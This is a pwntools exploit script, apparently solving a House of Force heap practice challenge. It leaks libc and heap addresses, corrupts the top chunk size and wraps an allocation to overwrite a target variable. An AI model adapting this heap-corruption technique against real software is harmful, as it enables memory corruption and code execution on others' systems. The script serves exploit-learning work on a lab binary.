from pwn import *

elf = ELF("./house_of_force")
p = elf.process()
libc = ELF(elf.runpath + b"/libc.so.6")

def malloc(size , data):
    p.sendline(b"1")
    p.sendafter(b"size: " , f"{size}".encode())
    p.sendafter(b"data: " , data)
    p.recvuntil(b"> ")

p.recvuntil(b"puts() @ ")
libc_leak = int(p.recvline() , 16) - libc.sym.puts

p.recvuntil(b"heap @ ")
heap = int(p.recvline() , 16)

log.info(f"Libc Address is at {hex(libc_leak)}")
log.info(f"Heap Starts at {hex(heap)}")

p.recvuntil(b"> ")
p.timeout = 0.1

malloc(24,b'Y'*24 + p64(0xffffffffffffffff))

log.info("Changed the Top Chunk value")

wrap = (0xffffffffffffffff - (heap + 0x20)) + (elf.sym.target - 0x20)

malloc(wrap , b"Y")

log.info("Wrapped around and reached just before target")

malloc(24 , b"I win yay")

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b"target: ")

log.info(f"The target value has been overwritten to : {p.recvline()}")

#gdb.attach(p)

p.interactive()
